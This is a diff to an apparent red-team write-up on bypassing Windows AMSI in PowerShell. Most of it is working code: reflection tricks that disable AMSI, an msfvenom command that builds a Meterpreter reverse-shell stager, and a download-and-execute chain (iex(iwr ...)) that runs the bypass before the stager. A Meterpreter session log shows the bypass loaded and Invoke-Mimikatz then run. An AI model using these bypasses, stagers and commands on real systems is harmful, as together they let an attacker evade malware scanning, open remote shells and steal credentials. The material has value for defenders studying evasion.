@@ -73,22 +73,16 @@ All the known bypasses are based on the fact that the AMSI DLL is loaded in the 
 If we are able to force an error inside AMSI, the protected field `amsiInitField` will be set and AMSI won't be called anymore.
 
 ```powershell
-$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
-[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
-[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) # allocate some memory
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null) # overwrite `amsiSession`
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem) # overwrite `amsiContext`
+Write-host -ForegroundColor green "AMSI won't be called anymore"
 ```
 
 ### Setting amsiInitFailed to $true
 
+Instead of causing an error, we can also directly set ourselves the `amsiInitField` property.
 [@mattifestation](https://twitter.com/mattifestation) bypass is so short to fit into a [tweet](https://twitter.com/mattifestation/status/735261176745988096). [3]
-
-```powershell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-```
-
-The `amsi.dll` instance loaded has a private field called `amsiInitFailed`.
-It's not directly exposed due to the fact that the field is private, but thanks to the [.NET Reflection API](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection) we can access it.
-By setting it at `$true` we can successfully disable AMSI and `amsi.dll`'s `AmsiScanBuffer` won't be called anymore.
 
 ```powershell
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') # get `amsi.dll` handle
@@ -97,13 +91,16 @@ $field.SetValue($null,$true) # set it to `$true`
 Write-host -ForegroundColor green "AMSI won't be called anymore"
 ```
 
+The `amsiInitFailed` property is not directly exposed due to the fact that the it's declared private, but thanks to the [.NET Reflection API](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/reflection) we can access it.
+By setting it at `$true` we can successfully disable AMSI and `amsi.dll`'s `AmsiScanBuffer` won't be called anymore.
+
 ### Patching AmsiScanBuffer
 
 It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, we are interested in patching the function `AmsiScanBuffer`. We can overwrite the logic of this function by making them always return `S_OK`, as when the command is allowed to run.
 
 ![AMSI Patch](../assets/images/amsi-patch.png "AMSI Patch")
 
-In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest `C#` version.
+In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest version.
 
 ```powershell
 # Add-Type writes *.cs on disk!!
@@ -229,10 +226,73 @@ It works by doing two things:
 
 ### Meterpreter
 
-_TODO_
+We can use the bypass to first spawn a meterpreter instance via PowerShell and then to execute any `*.ps1` scripts. A [PR](https://github.com/rapid7/rex-powershell/pull/17) is on its way.
+For now, to spawn it we need to generate the stager via the following command:
 
-[PR](https://github.com/rapid7/rex-powershell/pull/17)
+```asd
+msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=3000 LHOST=127.0.0.1 -f psh > meter.ps1
+```
 
+and execute the bypass before it:
+
+```powershell
+iex(iwr https://127.0.0.1/Invoke-Bypass.ps1)
+Invoke-BypassScriptBlockLog
+Invoke-BypassAMSI
+iex(iwr https://127.0.0.1/meter.ps1)
+```
+
+We can also use the AMSI bypass to execute arbitrary PowerShell code on the machine from a meterpreter session. If we try to _execute_ `'amsiutils'` in a PowerShell session you will get something like this:
+
+```asd
+msf5 exploit(multi/handler) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_execute "'amsiutils'"
+[+] Command execution completed:
+ERROR:
+```
+
+but if we load [Invoke-Bypass](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1) and execute the bypasses, we are then allowed to run ay kind of command, including, for example, [Invoke-Mimikatz](https://github.com/d0nkeys/redteam/blob/master/credentials/Invoke-Mimikatz.ps1).
+
+```
+meterpreter > powershell_import Invoke-Bypass.ps1
+[+] File successfully imported. No result was returned.
+meterpreter > powershell_execute "Invoke-BypassScriptBlockLog"
+[+] Command execution completed:
+
+meterpreter > powershell_execute "Invoke-BypassAMSI"
+[+] Command execution completed:
+
+meterpreter > powershell_execute "'amsiutils'"
+[+] Command execution completed:
+amsiutils
+
+meterpreter > powershell_import Invoke-Mimikatz.ps1
+[+] File successfully imported. No result was returned.
+meterpreter > powershell_execute "Invoke-Mimikatz -Command coffee"
+[+] Command execution completed:
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec 31 2018 01:15:11
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----'
+
+meterpreter >
+```
 
 ## References
 
